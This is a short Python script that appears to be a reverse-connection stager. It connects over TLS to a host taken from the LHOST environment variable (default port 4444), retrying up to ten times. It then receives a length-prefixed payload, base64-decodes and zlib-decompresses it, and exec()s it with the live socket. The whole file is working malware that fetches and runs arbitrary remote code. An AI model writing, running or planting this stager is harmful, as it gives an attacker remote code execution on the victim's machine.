#!/usr/bin/env python
import zlib,base64,ssl,socket,struct,time,os
h=os.environ['LHOST']
p=int(os.getenv('LPORT','4444'))
for x in range(10):
        try:
                so=socket.socket(2,1)
                so.connect((h,p))
                s=ssl.wrap_socket(so)
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
